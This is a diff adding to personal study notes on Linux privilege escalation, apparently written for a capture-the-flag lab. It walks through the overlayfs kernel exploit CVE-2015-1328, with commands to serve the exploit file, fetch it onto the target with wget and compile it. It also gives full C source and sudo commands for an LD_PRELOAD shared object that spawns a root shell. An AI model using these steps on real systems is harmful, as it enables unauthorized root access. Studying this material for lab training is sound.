@@ -82,7 +82,50 @@ Kernel Exploits
 -privEsc ideally leads to root privileges
 -achieved by exploting an existing vuln or accessing another user account that has higher privileges
 -rely on misconfigurations and lax permissions
--methodology
+-methodology:
 1. Id the Kernel version
-2. search and find an exploit code 
+2. search and find an exploit code (https://www.linuxkernelcves.com/cves)
 3. Run the exploit
+
+Linux Kernel 3.13.0-24-generic x86 64
+CVE-2015-1328: Allows local users to obtain root access by leveraging a configuration in which 'overlayfs' is permitted in an arbitrary mount namespace. 
+Exploit: https://www.exploit-db.com/exploits/37292
+1. Need to copy exploit file to the target machine
+	a. start a python server to serve the file
+	python3 -m http.server 8888
+	b. on target machine copy the file in the /tmp folder
+	wget http://1.2.3.4/8888/exploit.c
+2. compile the exploit
+gcc exploit.c -o pwned
+3. search for flag
+find . -name flag1.txt
+4. cat flag1.txt
+
+Sudo
+-check root privileges using 'sudo -l'
+-Leverage application functions: some application allow the loading of alternative configuration files
+eg: Apache2 ('-f': specify an alternate ServerConfigFile)
+-Leverage LD_PRELOAD: allows any program to use shared libraries
+-if "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run
+-LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID
+-Methodology:
+1. Check for LD_PRELOAD(with the env_keep option enabled)
+2. Write a simple C code compiled as a share object (.so extension) file
+3. Run the program with sudo rights and LD_PRELOAD option pointing to our .so file
+The C code will simply spawn a root shell and can be written as follows; shell.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+-use this shared object file when launching any program the user can run with sudo
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+
